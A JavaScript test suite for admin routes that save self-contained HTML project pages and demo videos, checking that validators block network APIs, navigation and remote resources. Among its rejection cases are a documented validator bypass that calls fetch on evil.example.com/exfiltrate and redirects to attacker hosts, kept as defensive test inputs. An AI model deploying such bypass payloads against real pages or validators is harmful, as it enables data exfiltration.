/**
 * projectHomeAdminRoutes.test.cjs — lib/feedback-remote/projectHomeAdminRoutes.cjs's two
 * routes (POST /admin/project-home/write and
 * POST /admin/project-home/demo-video/write, both {cwd, html}) and their
 * self-contained-HTML validators.
 *
 * Run: timeout 120 npx vitest run src/main/__tests__/projectHomeAdminRoutes.test.cjs
 */

'use strict';

import { test, expect, afterEach } from 'vitest';
const fs = require('node:fs');
const fsp = require('node:fs/promises');
const os = require('node:os');
const path = require('node:path');
const config = require('../config.cjs');
const {
  registerAdminRoute,
  validateHomeHtml,
  validateDemoVideoHtml,
  injectCsp,
  maxVideoBytes,
  DEMO_VIDEO_CSP,
  MAX_HTML_BYTES,
  MAX_DEMO_VIDEO_BYTES,
} = require('../lib/feedback-remote/projectHomeAdminRoutes.cjs');

const tmpDirs = [];
afterEach(async () => {
  while (tmpDirs.length) {
    const d = tmpDirs.pop();
    await fsp.rm(d, { recursive: true, force: true });
  }
});

async function mkProjectCwd() {
  const dir = await fsp.mkdtemp(path.join(os.tmpdir(), 'sm-project-home-admin-'));
  config.addAllowedRoot(dir);
  fs.mkdirSync(path.join(dir, 'session-manager-operations'), { recursive: true });
  tmpDirs.push(dir);
  return dir;
}

/** Fake adminHttp stub: captures registered routes and invokes one directly. */
function makeFakeAdminHttp() {
  const routes = new Map();
  return {
    registerRoute(method, url, handler) {
      routes.set(`${method} ${url}`, handler);
    },
    async call(method, url, { rawBody, body } = {}) {
      const handler = routes.get(`${method} ${url}`);
      if (!handler) throw new Error(`no route registered for ${method} ${url}`);
      const text = rawBody !== undefined ? rawBody : body !== undefined ? JSON.stringify(body) : '';
      const chunks = text ? [Buffer.from(text)] : [];
      const req = {
        on(event, cb) {
          if (event === 'data') chunks.forEach((c) => cb(c));
          if (event === 'end') cb();
          return req;
        },
      };
      let status = null;
      let payload = null;
      const res = {
        writeHead(s) { status = s; },
        end(b) { payload = b ? JSON.parse(b) : null; },
      };
      await handler(req, res, new URLSearchParams());
      return { status, body: payload };
    },
    routes,
  };
}

const GOOD_HTML = '<!DOCTYPE html><html><head><style>body{background:url(data:image/png;base64,AAAA)}</style></head><body><script>1+1</script></body></html>';

const GOOD_DEMO_VIDEO_HTML = '<!DOCTYPE html><html><head><meta name="sm-demo-duration" content="15"></head>'
  + '<body><canvas id="c"></canvas><script>window.smDemo = { scenes: [] }; const ctx = document.getElementById("c").getContext("2d"); ctx.fillRect(0,0,10,10);</script></body></html>';

test('registers the library routes, the aliases, the character route and the matrix routes', () => {
  const adminHttp = makeFakeAdminHttp();
  registerAdminRoute(adminHttp);
  expect([...adminHttp.routes.keys()].sort()).toEqual([
    'POST /admin/project-home/character/write',
    'POST /admin/project-home/demo-video/write',
    'POST /admin/project-home/matrix/read',
    'POST /admin/project-home/matrix/write',
    'POST /admin/project-home/pages/write',
    'POST /admin/project-home/videos/write',
    'POST /admin/project-home/write',
  ].sort());
});

const pagesRoot = (cwd) => path.join(fs.realpathSync(cwd), 'session-manager-operations', 'project-pages');

test('/write alias writes knowledge/overview/ (index.html + meta.json)', async () => {
  const cwd = await mkProjectCwd();
  const adminHttp = makeFakeAdminHttp();
  registerAdminRoute(adminHttp);
  const { status, body } = await adminHttp.call('POST', '/admin/project-home/write', { body: { cwd, html: GOOD_HTML } });
  expect(status).toBe(200);
  expect(body.ok).toBe(true);
  const dir = path.join(pagesRoot(cwd), 'knowledge', 'overview');
  expect(body.path).toBe(path.join(dir, 'index.html'));
  expect(typeof body.bytes).toBe('number');
  expect(fs.readFileSync(body.path, 'utf8')).toBe(GOOD_HTML);
  expect(fs.readdirSync(dir).sort()).toEqual(['index.html', 'meta.json']);
  const meta = JSON.parse(fs.readFileSync(path.join(dir, 'meta.json'), 'utf8'));
  expect(meta).toMatchObject({ id: 'overview', title: 'Overview', topic: 'overview' });
  expect(Number.isNaN(Date.parse(meta.createdAt))).toBe(false);
});

test('a second /write replaces the overview page only', async () => {
  const cwd = await mkProjectCwd();
  const adminHttp = makeFakeAdminHttp();
  registerAdminRoute(adminHttp);
  await adminHttp.call('POST', '/admin/project-home/pages/write', { body: { cwd, pageId: 'other', title: 'Other', html: '<p>keep</p>' } });
  await adminHttp.call('POST', '/admin/project-home/write', { body: { cwd, html: '<p>one</p>' } });
  await adminHttp.call('POST', '/admin/project-home/write', { body: { cwd, html: '<p>two</p>' } });
  const root = path.join(pagesRoot(cwd), 'knowledge');
  expect(fs.readFileSync(path.join(root, 'overview', 'index.html'), 'utf8')).toBe('<p>two</p>');
  expect(fs.readFileSync(path.join(root, 'other', 'index.html'), 'utf8')).toBe('<p>keep</p>');
  expect(fs.readdirSync(root).sort()).toEqual(['other', 'overview']);
});

test('pages/write writes knowledge/<pageId>/ and rejects bad ids, schema and remote refs', async () => {
  const cwd = await mkProjectCwd();
  const adminHttp = makeFakeAdminHttp();
  registerAdminRoute(adminHttp);
  const route = '/admin/project-home/pages/write';
  const ok = await adminHttp.call('POST', route, { body: { cwd, pageId: 'arch-notes', title: 'Arch', topic: 't', html: GOOD_HTML } });
  expect(ok.status).toBe(200);
  const dir = path.join(pagesRoot(cwd), 'knowledge', 'arch-notes');
  expect(ok.body.path).toBe(path.join(dir, 'index.html'));
  expect(JSON.parse(fs.readFileSync(path.join(dir, 'meta.json'), 'utf8'))).toMatchObject({ id: 'arch-notes', title: 'Arch', topic: 't' });
  for (const bad of [
    { pageId: '_character' },
    { pageId: 'Bad Id' },
    { pageId: '../x' },
    { title: '' },
    { extra: 1 },
    { html: '<script src="x.js"></script>' },
  ]) {
    const r = await adminHttp.call('POST', route, { body: { cwd, pageId: 'p1', title: 'T', html: '<p>x</p>', ...bad } });
    expect(r.status).toBe(400);
  }
  expect(fs.readdirSync(path.join(pagesRoot(cwd), 'knowledge')).sort()).toEqual(['arch-notes']);
});

test.each([
  ['empty', ''],
  ['whitespace only', '  \n '],
  ['script src', '<html><script src="app.js"></script></html>'],
  ['script src (remote, single quotes, attrs first)', "<script defer type='module' src='https://cdn.example.com/x.js'></script>"],
  ['link href http', '<link rel="stylesheet" href="https://fonts.googleapis.com/css">'],
  ['link href protocol-relative', '<link rel="stylesheet" href="//cdn.example.com/a.css">'],
  ['@import', '<style>@import url("https://x.com/a.css");</style>'],
  ['@import bare string', '<style>@import "a.css";</style>'],
  ['css url(http)', '<style>a{background:url(https://x.com/a.png)}</style>'],
  ['css url(quoted http)', "<style>a{background:url( 'http://x.com/a.png')}</style>"],
])('rejects %s with 400 and writes nothing', async (_label, html) => {
  const cwd = await mkProjectCwd();
  const adminHttp = makeFakeAdminHttp();
  registerAdminRoute(adminHttp);
  const { status, body } = await adminHttp.call('POST', '/admin/project-home/write', { body: { cwd, html } });
  expect(status).toBe(400);
  expect(body.ok).toBe(false);
  expect(fs.existsSync(path.join(cwd, 'session-manager-operations', 'project-pages'))).toBe(false);
});

test('rejects html over 1MB', async () => {
  const cwd = await mkProjectCwd();
  const adminHttp = makeFakeAdminHttp();
  registerAdminRoute(adminHttp);
  const html = 'a'.repeat(MAX_HTML_BYTES + 1);
  const { status, body } = await adminHttp.call('POST', '/admin/project-home/write', { body: { cwd, html } });
  expect(status).toBe(400);
  expect(body.error).toContain('limit');
});

test('a request body far beyond the cap is a clean 400, not a throw', async () => {
  const cwd = await mkProjectCwd();
  const adminHttp = makeFakeAdminHttp();
  registerAdminRoute(adminHttp);
  const html = 'a'.repeat(MAX_HTML_BYTES * 3);
  const { status, body } = await adminHttp.call('POST', '/admin/project-home/write', { body: { cwd, html } });
  expect(status).toBe(400);
  expect(body.error).toContain('limit');
});

test('accepts an inline <link> to a local/data href and plain http text content', () => {
  expect(validateHomeHtml('<p>see https://example.com in prose</p>')).toBeNull();
  expect(validateHomeHtml('<link rel="icon" href="data:image/png;base64,AAAA">')).toBeNull();
});

test('validateHomeHtml exact 1MB is accepted, non-string rejected', () => {
  expect(validateHomeHtml('a'.repeat(MAX_HTML_BYTES))).toBeNull();
  expect(validateHomeHtml(undefined)).toMatch(/non-empty/);
});

test('bad JSON, missing/relative cwd, non-project cwd, and unknown keys are 400s', async () => {
  const adminHttp = makeFakeAdminHttp();
  registerAdminRoute(adminHttp);
  const route = '/admin/project-home/write';
  expect((await adminHttp.call('POST', route, { rawBody: '{nope' })).status).toBe(400);
  expect((await adminHttp.call('POST', route, { body: { html: 'x' } })).status).toBe(400);
  expect((await adminHttp.call('POST', route, { body: { cwd: 'relative/dir', html: 'x' } })).status).toBe(400);
  expect((await adminHttp.call('POST', route, { body: { cwd: '/x', html: 'x', extra: 1 } })).status).toBe(400);

  const bare = await fsp.mkdtemp(path.join(os.tmpdir(), 'sm-project-home-bare-'));
  tmpDirs.push(bare);
  config.addAllowedRoot(bare);
  const res = await adminHttp.call('POST', route, { body: { cwd: bare, html: '<p>x</p>' } });
  expect(res.status).toBe(400);
  expect(res.body.error).toContain('not a Session Manager project');
});

// ───────────────────────────────── POST /admin/project-home/demo-video/write

const videoMeta = (over = {}) => ({
  style: 'plain',
  character: null,
  sources: [],
  report: { lufs: null, truePeakDb: null, speechS: null, readingGrade: null, checks: [] },
  macroVersion: 1,
  seedVersion: 1,
  model: 'm',
  effort: 'low',
  title: 'T',
  kind: 'project-demo',
  lengthS: 15,
  ...over,
});
const videoBody = (cwd, over = {}) => ({ cwd, videoId: 'my-vid', title: 'My video', kind: 'project-demo', lengthS: 15, html: GOOD_DEMO_VIDEO_HTML, meta: videoMeta(), ...over });
const durHtml = (n) => `<html><head><meta name="sm-demo-duration" content="${n}"></head><body>x</body></html>`;

test('demo-video alias adds a new videos/vid-*/ entry with CSP + bridge; two calls leave two entries; overview untouched', async () => {
  const cwd = await mkProjectCwd();
  const adminHttp = makeFakeAdminHttp();
  registerAdminRoute(adminHttp);
  await adminHttp.call('POST', '/admin/project-home/write', { body: { cwd, html: GOOD_HTML } });

  const r1 = await adminHttp.call('POST', '/admin/project-home/demo-video/write', { body: { cwd, html: GOOD_DEMO_VIDEO_HTML } });
  const r2 = await adminHttp.call('POST', '/admin/project-home/demo-video/write', { body: { cwd, html: GOOD_DEMO_VIDEO_HTML } });
  expect(r1.status).toBe(200);
  expect(r1.body.ok).toBe(true);
  expect(typeof r1.body.path).toBe('string');
  expect(typeof r1.body.bytes).toBe('number');
  const vids = fs.readdirSync(path.join(pagesRoot(cwd), 'videos'));
  expect(vids).toHaveLength(2);
  for (const v of vids) expect(v).toMatch(/^vid-[a-z0-9]+$/);
  const dir = path.dirname(r1.body.path);
  expect(fs.readdirSync(dir).sort()).toEqual(['index.html', 'meta.json']);
  const meta = JSON.parse(fs.readFileSync(path.join(dir, 'meta.json'), 'utf8'));
  expect(meta).toMatchObject({ kind: 'project-demo', lengthS: 15, id: path.basename(dir) });
  expect(meta.report.bytes).toBe(r1.body.bytes);
  const written = fs.readFileSync(r1.body.path, 'utf8');
  expect(written.startsWith(`<!DOCTYPE html>${DEMO_VIDEO_CSP}`)).toBe(true);
  expect(written).toContain('data-sm-player-bridge');
  expect(fs.readFileSync(path.join(pagesRoot(cwd), 'knowledge', 'overview', 'index.html'), 'utf8')).toBe(GOOD_HTML);
});

test('videos/write saves HTML with the CSP and the bridge, stamps id/createdAt/bytes, and replaces only that entry', async () => {
  const cwd = await mkProjectCwd();
  const adminHttp = makeFakeAdminHttp();
  registerAdminRoute(adminHttp);
  const route = '/admin/project-home/videos/write';
  const a = await adminHttp.call('POST', route, { body: videoBody(cwd) });
  expect(a.status).toBe(200);
  await adminHttp.call('POST', route, { body: videoBody(cwd, { videoId: 'other-vid' }) });
  const dir = path.join(pagesRoot(cwd), 'videos', 'my-vid');
  expect(a.body.path).toBe(path.join(dir, 'index.html'));
  const html = fs.readFileSync(a.body.path, 'utf8');
  expect(html.startsWith(`<!DOCTYPE html>${DEMO_VIDEO_CSP}`)).toBe(true);
  expect(html).toContain('data-sm-player-bridge');
  expect(html.indexOf(DEMO_VIDEO_CSP)).toBeLessThan(html.indexOf('data-sm-player-bridge'));
  const meta = JSON.parse(fs.readFileSync(path.join(dir, 'meta.json'), 'utf8'));
  expect(meta).toMatchObject({ id: 'my-vid', title: 'My video', kind: 'project-demo', lengthS: 15 });
  expect(meta.report.bytes).toBe(Buffer.byteLength(html, 'utf8'));
  expect(Number.isNaN(Date.parse(meta.createdAt))).toBe(false);

  const again = await adminHttp.call('POST', route, { body: videoBody(cwd, { title: 'Renamed' }) });
  expect(again.status).toBe(200);
  expect(JSON.parse(fs.readFileSync(path.join(dir, 'meta.json'), 'utf8')).title).toBe('Renamed');
  expect(fs.readdirSync(path.join(pagesRoot(cwd), 'videos')).sort()).toEqual(['my-vid', 'other-vid']);
});

test('videos/write rejects schema errors, bad ids, duration mismatch and network APIs with 400', async () => {
  const cwd = await mkProjectCwd();
  const adminHttp = makeFakeAdminHttp();
  registerAdminRoute(adminHttp);
  const route = '/admin/project-home/videos/write';
  for (const over of [
    { videoId: '_character' },
    { videoId: 'Bad' },
    { kind: 'nope' },
    { lengthS: 4 },
    { lengthS: 61 },
    { extra: 1 },
    { lengthS: 20 }, // html declares 15
    { html: GOOD_DEMO_VIDEO_HTML.replace('ctx.fillRect', 'fetch("/x");ctx.fillRect') },
  ]) {
    const r = await adminHttp.call('POST', route, { body: videoBody(cwd, over) });
    expect(r.status).toBe(400);
    expect(r.body.ok).toBe(false);
  }
  expect(fs.existsSync(path.join(pagesRoot(cwd), 'videos'))).toBe(false);
});

test('videos/write re-runs kit checks: htmlLimits and failed report.checks refuse with 400 naming the check', async () => {
  const cwd = await mkProjectCwd();
  const adminHttp = makeFakeAdminHttp();
  registerAdminRoute(adminHttp);
  const route = '/admin/project-home/videos/write';
  const noScenes = GOOD_DEMO_VIDEO_HTML.replace('window.smDemo = { scenes: [] };', '');
  const r1 = await adminHttp.call('POST', route, { body: videoBody(cwd, { html: noScenes }) });
  expect(r1.status).toBe(400);
  expect(JSON.stringify(r1.body)).toContain('htmlLimits');
  const bad = videoMeta({ report: { lufs: null, truePeakDb: null, speechS: null, readingGrade: null, checks: [{ id: 'captions', ok: true, detail: '' }, { id: 'blankFrames', ok: false, detail: 'blank' }] } });
  const r2 = await adminHttp.call('POST', route, { body: videoBody(cwd, { meta: bad }) });
  expect(r2.status).toBe(400);
  expect(JSON.stringify(r2.body)).toContain('blankFrames');
  expect(fs.existsSync(path.join(pagesRoot(cwd), 'videos'))).toBe(false);
});

test('demo-video alias is exempt from the kit checks (no smDemo, no report)', async () => {
  const cwd = await mkProjectCwd();
  const adminHttp = makeFakeAdminHttp();
  registerAdminRoute(adminHttp);
  const html = GOOD_DEMO_VIDEO_HTML.replace('window.smDemo = { scenes: [] };', '');
  const r = await adminHttp.call('POST', '/admin/project-home/demo-video/write', { body: { cwd, html } });
  expect(r.status).toBe(200);
});

test('video size cap scales with length: 4 MiB at 60 s, 2 MiB at 30 s', async () => {
  expect(maxVideoBytes(30)).toBe(2 * 1024 * 1024);
  expect(maxVideoBytes(60)).toBe(4 * 1024 * 1024);
  const cwd = await mkProjectCwd();
  const adminHttp = makeFakeAdminHttp();
  registerAdminRoute(adminHttp);
  const route = '/admin/project-home/videos/write';
  const pad = (n, len) => durHtml(n).replace('x</body>', `<script>window.smDemo={scenes:[]}</script><!--${'a'.repeat(len)}--></body>`);
  const big = pad(60, 3 * 1024 * 1024);
  const ok = await adminHttp.call('POST', route, { body: videoBody(cwd, { lengthS: 60, html: big }) });
  expect(ok.status).toBe(200);
  const tooBig30 = await adminHttp.call('POST', route, { body: videoBody(cwd, { videoId: 'v30', lengthS: 30, html: pad(30, 3 * 1024 * 1024) }) });
  expect(tooBig30.status).toBe(400);
  expect(tooBig30.body.error).toMatch(/limit|cap/);
  const tooBig60 = await adminHttp.call('POST', route, { body: videoBody(cwd, { videoId: 'v60', lengthS: 60, html: pad(60, 4 * 1024 * 1024) }) });
  expect(tooBig60.status).toBe(400);
  expect(tooBig60.body.error).toMatch(/limit|cap/);
});

test('injectCsp always puts the CSP meta first after a fresh doctype, replacing any existing CSP meta and leading doctype', () => {
  const noDoctype = injectCsp('<html><body>x</body></html>');
  expect(noDoctype).toBe(`<!DOCTYPE html>${DEMO_VIDEO_CSP}<html><body>x</body></html>`);

  const existingCsp = '<html><head><meta http-equiv="Content-Security-Policy" content="default-src *"><title>t</title></head><body>x</body></html>';
  const replaced = injectCsp(existingCsp);
  expect(replaced).toBe(`<!DOCTYPE html>${DEMO_VIDEO_CSP}<html><head><title>t</title></head><body>x</body></html>`);

  const withDoctype = injectCsp('<!DOCTYPE html><html><head><title>t</title></head><body>x</body></html>');
  expect(withDoctype).toBe(`<!DOCTYPE html>${DEMO_VIDEO_CSP}<html><head><title>t</title></head><body>x</body></html>`);
});

test.each([
  ['empty', ''],
  ['whitespace only', '  \n '],
  ['script src (remote)', `<html><head><meta name="sm-demo-duration" content="10"></head><body><script src="https://cdn.example.com/x.js"></script></body></html>`],
  ['fetch(', `<html><head><meta name="sm-demo-duration" content="10"></head><body><script>fetch('/x')</script></body></html>`],
  ['XMLHttpRequest', `<html><head><meta name="sm-demo-duration" content="10"></head><body><script>new XMLHttpRequest()</script></body></html>`],
  ['WebSocket', `<html><head><meta name="sm-demo-duration" content="10"></head><body><script>new WebSocket('wss://x')</script></body></html>`],
  ['EventSource', `<html><head><meta name="sm-demo-duration" content="10"></head><body><script>new EventSource('/x')</script></body></html>`],
  ['sendBeacon', `<html><head><meta name="sm-demo-duration" content="10"></head><body><script>navigator.sendBeacon('/x')</script></body></html>`],
  ['dynamic import(', `<html><head><meta name="sm-demo-duration" content="10"></head><body><script>import('/x.js')</script></body></html>`],
  ['importScripts', `<html><head><meta name="sm-demo-duration" content="10"></head><body><script>importScripts('/x.js')</script></body></html>`],
  ['<iframe', `<html><head><meta name="sm-demo-duration" content="10"></head><body><iframe src="data:text/html,x"></iframe></body></html>`],
  ['<object', `<html><head><meta name="sm-demo-duration" content="10"></head><body><object data="x"></object></body></html>`],
  ['<embed', `<html><head><meta name="sm-demo-duration" content="10"></head><body><embed src="x"></body></html>`],
  ['window.open', `<html><head><meta name="sm-demo-duration" content="10"></head><body><script>window.open('/x')</script></body></html>`],
  ['href= http', `<html><head><meta name="sm-demo-duration" content="10"></head><body><a href="https://example.com">x</a></body></html>`],
  ['src= protocol-relative', `<html><head><meta name="sm-demo-duration" content="10"></head><body><img src="//example.com/a.png"></body></html>`],
  ['missing duration meta', '<html><head></head><body><p>x</p></body></html>'],
  ['duration 61 (above range)', '<html><head><meta name="sm-demo-duration" content="61"></head><body><p>x</p></body></html>'],
  ['duration 4 (below range)', '<html><head><meta name="sm-demo-duration" content="4"></head><body><p>x</p></body></html>'],
  ['computed window["fetch"] access', `<html><head><meta name="sm-demo-duration" content="10"></head><body><script>window["fetch"]("/x")</script></body></html>`],
  ['Worker(', `<html><head><meta name="sm-demo-duration" content="10"></head><body><script>new Worker("x.js")</script></body></html>`],
  ['SharedWorker', `<html><head><meta name="sm-demo-duration" content="10"></head><body><script>new SharedWorker("x.js")</script></body></html>`],
  ['serviceWorker', `<html><head><meta name="sm-demo-duration" content="10"></head><body><script>navigator.serviceWorker.register("x.js")</script></body></html>`],
  ['rel=preload', `<html><head><meta name="sm-demo-duration" content="10"></head><body><link rel="preload" href="x.png"></body></html>`],
  ['eval(', `<html><head><meta name="sm-demo-duration" content="10"></head><body><script>eval("1+1")</script></body></html>`],
  ['Function(', `<html><head><meta name="sm-demo-duration" content="10"></head><body><script>new Function("return 1")()</script></body></html>`],
  ['<base', `<html><head><meta name="sm-demo-duration" content="10"><base href="/"></head><body>x</body></html>`],
  ['<form', `<html><head><meta name="sm-demo-duration" content="10"></head><body><form></form></body></html>`],
])('rejects %s with 400 and writes nothing', async (_label, html) => {
  const cwd = await mkProjectCwd();
  const adminHttp = makeFakeAdminHttp();
  registerAdminRoute(adminHttp);
  const { status, body } = await adminHttp.call('POST', '/admin/project-home/demo-video/write', { body: { cwd, html } });
  expect(status).toBe(400);
  expect(body.ok).toBe(false);
  expect(fs.existsSync(path.join(cwd, 'session-manager-operations', 'project-pages', 'demo-video'))).toBe(false);
});

test('rejects a 30 s demo-video html over 2MB', async () => {
  const cwd = await mkProjectCwd();
  const adminHttp = makeFakeAdminHttp();
  registerAdminRoute(adminHttp);
  const html = durHtml(30).replace('x</body>', `<!--${'a'.repeat(MAX_DEMO_VIDEO_BYTES)}--></body>`);
  const { status, body } = await adminHttp.call('POST', '/admin/project-home/demo-video/write', { body: { cwd, html } });
  expect(status).toBe(400);
  expect(body.error).toContain('limit');
});

test('demo-video route: relative cwd is a 400', async () => {
  const adminHttp = makeFakeAdminHttp();
  registerAdminRoute(adminHttp);
  const res = await adminHttp.call('POST', '/admin/project-home/demo-video/write', { body: { cwd: 'relative/dir', html: GOOD_DEMO_VIDEO_HTML } });
  expect(res.status).toBe(400);
});

test('validateDemoVideoHtml accepts GOOD_DEMO_VIDEO_HTML and exact-boundary durations 5, 30 and 60', () => {
  expect(validateDemoVideoHtml(GOOD_DEMO_VIDEO_HTML)).toBeNull();
  expect(validateDemoVideoHtml('<html><head><meta name="sm-demo-duration" content="5"></head><body>x</body></html>')).toBeNull();
  expect(validateDemoVideoHtml('<html><head><meta name="sm-demo-duration" content="30"></head><body>x</body></html>')).toBeNull();
  expect(validateDemoVideoHtml('<html><head><meta name="sm-demo-duration" content="60"></head><body>x</body></html>')).toBeNull();
});

test('validateDemoVideoHtml accepts a legitimate requestAnimationFrame/canvas demo', () => {
  const html = '<!DOCTYPE html><html><head><meta name="sm-demo-duration" content="12"></head>'
    + '<body><canvas id="c" width="200" height="100"></canvas><script>'
    + 'const ctx = document.getElementById("c").getContext("2d");'
    + 'let x = 0;'
    + 'const draw = () => { ctx.clearRect(0,0,200,100); ctx.fillRect(x,0,10,10); x = (x+1)%200; requestAnimationFrame(draw); };'
    + 'requestAnimationFrame(draw);'
    + '</script></body></html>';
  expect(validateDemoVideoHtml(html)).toBeNull();
});

test("validateDemoVideoHtml rejects the validator's demonstrated bypass: comment-decoy <head> + computed window[\"fetch\"]", () => {
  const exploit = '<!DOCTYPE html><html>'
    + '<!-- decoy: <head> this is not a real head tag, just a comment -->'
    + '<body><meta name="sm-demo-duration" content="10">'
    + '<script>window["fetch"]("https://evil.example.com/exfiltrate")</script>'
    + '</body></html>';
  const rejection = validateDemoVideoHtml(exploit);
  expect(rejection).not.toBeNull();
  expect(rejection).toMatch(/network-capable/);
});

test('validateDemoVideoHtml rejects meta refresh navigation', () => {
  const html = '<!DOCTYPE html><html><head><meta name="sm-demo-duration" content="10">'
    + '<meta http-equiv="refresh" content="0;url=https://attacker/exfiltrate"></head>'
    + '<body>x</body></html>';
  const rejection = validateDemoVideoHtml(html);
  expect(rejection).not.toBeNull();
  expect(rejection).toMatch(/network-capable/);
});

test('validateDemoVideoHtml rejects location.href/assign/replace navigation', () => {
  const base = '<!DOCTYPE html><html><head><meta name="sm-demo-duration" content="10"></head><body><script>';
  const tail = '</script></body></html>';
  expect(validateDemoVideoHtml(`${base}location.href = "https://attacker.example"${tail}`)).toMatch(/network-capable/);
  expect(validateDemoVideoHtml(`${base}location.assign("https://attacker.example")${tail}`)).toMatch(/network-capable/);
  expect(validateDemoVideoHtml(`${base}location.replace("https://attacker.example")${tail}`)).toMatch(/network-capable/);
  expect(validateDemoVideoHtml(`${base}location = "https://attacker.example"${tail}`)).toMatch(/network-capable/);
});

test('validateDemoVideoHtml does not reject "allocation" or a strict equality check on location', () => {
  const html = '<!DOCTYPE html><html><head><meta name="sm-demo-duration" content="10"></head>'
    + '<body><canvas id="c"></canvas><script>'
    + 'const allocation = 1; if (allocation === 1 && typeof location === "object") { console.log(allocation); }'
    + '</script></body></html>';
  expect(validateDemoVideoHtml(html)).toBeNull();
});

test('validateDemoVideoHtml rejects document.location', () => {
  const html = '<!DOCTYPE html><html><head><meta name="sm-demo-duration" content="10"></head>'
    + '<body><script>document.location = "https://attacker.example"</script></body></html>';
  const rejection = validateDemoVideoHtml(html);
  expect(rejection).not.toBeNull();
  expect(rejection).toMatch(/network-capable/);
});

test('validateDemoVideoHtml rejects top./parent. property access', () => {
  const topHtml = '<!DOCTYPE html><html><head><meta name="sm-demo-duration" content="10"></head>'
    + '<body><script>top.location = "https://attacker.example"</script></body></html>';
  expect(validateDemoVideoHtml(topHtml)).toMatch(/network-capable/);
  const parentHtml = '<!DOCTYPE html><html><head><meta name="sm-demo-duration" content="10"></head>'
    + '<body><script>parent.location = "https://attacker.example"</script></body></html>';
  expect(validateDemoVideoHtml(parentHtml)).toMatch(/network-capable/);
});

test('validateDemoVideoHtml rejects anchor tags with http(s)/protocol-relative/javascript hrefs', () => {
  const base = '<!DOCTYPE html><html><head><meta name="sm-demo-duration" content="10"></head><body>';
  const tail = '</body></html>';
  expect(validateDemoVideoHtml(`${base}<a href="https://attacker.example">go</a>${tail}`)).toMatch(/network-capable/);
  expect(validateDemoVideoHtml(`${base}<a href="//attacker.example">go</a>${tail}`)).toMatch(/network-capable/);
  expect(validateDemoVideoHtml(`${base}<a href="javascript:alert(1)">go</a>${tail}`)).toMatch(/network-capable/);
});

test('injectCsp places the CSP meta immediately after the doctype even with a comment-decoy <head>', () => {
  const decoy = '<!DOCTYPE html><html>'
    + '<!-- decoy: <head> this is not a real head tag, just a comment -->'
    + '<body><p>hello</p></body></html>';
  const result = injectCsp(decoy);
  expect(result.startsWith(`<!DOCTYPE html>${DEMO_VIDEO_CSP}`)).toBe(true);
});

const GOOD_CHARACTER = {
  json: { name: 'Bit', palette: ['#fff', '#000'], voice: { engine: 'kokoro', id: 'af_heart' } },
  js: 'window.character={mount(){},pose(){},mouth(){}};',
};

test('character/write: first write, refusal without replace, replace overwrites', async () => {
  const cwd = await mkProjectCwd();
  const adminHttp = makeFakeAdminHttp();
  registerAdminRoute(adminHttp);
  const url = '/admin/project-home/character/write';
  const dir = path.join(pagesRoot(cwd), 'videos', '_character');

  const first = await adminHttp.call('POST', url, { body: { cwd, ...GOOD_CHARACTER } });
  expect(first.status).toBe(200);
  expect(fs.readFileSync(path.join(dir, 'character.js'), 'utf8')).toBe(GOOD_CHARACTER.js);
  expect(JSON.parse(fs.readFileSync(path.join(dir, 'character.json'), 'utf8')).name).toBe('Bit');

  const again = await adminHttp.call('POST', url, { body: { cwd, ...GOOD_CHARACTER, json: { ...GOOD_CHARACTER.json, name: 'Two' } } });
  expect(again.status).toBe(409);
  expect(JSON.parse(fs.readFileSync(path.join(dir, 'character.json'), 'utf8')).name).toBe('Bit');

  const replaced = await adminHttp.call('POST', url, { body: { cwd, ...GOOD_CHARACTER, json: { ...GOOD_CHARACTER.json, name: 'Two' }, replace: true } });
  expect(replaced.status).toBe(200);
  expect(JSON.parse(fs.readFileSync(path.join(dir, 'character.json'), 'utf8')).name).toBe('Two');
});

test('character/write: rejects network js, oversized js and bad json', async () => {
  const cwd = await mkProjectCwd();
  const adminHttp = makeFakeAdminHttp();
  registerAdminRoute(adminHttp);
  const url = '/admin/project-home/character/write';
  const net = await adminHttp.call('POST', url, { body: { cwd, ...GOOD_CHARACTER, js: 'fetch("x")' } });
  expect(net.status).toBe(400);
  const big = await adminHttp.call('POST', url, { body: { cwd, ...GOOD_CHARACTER, js: 'a'.repeat(300 * 1024 + 1) } });
  expect(big.status).toBe(400);
  const bad = await adminHttp.call('POST', url, { body: { cwd, ...GOOD_CHARACTER, json: { name: 'x' } } });
  expect(bad.status).toBe(400);
});
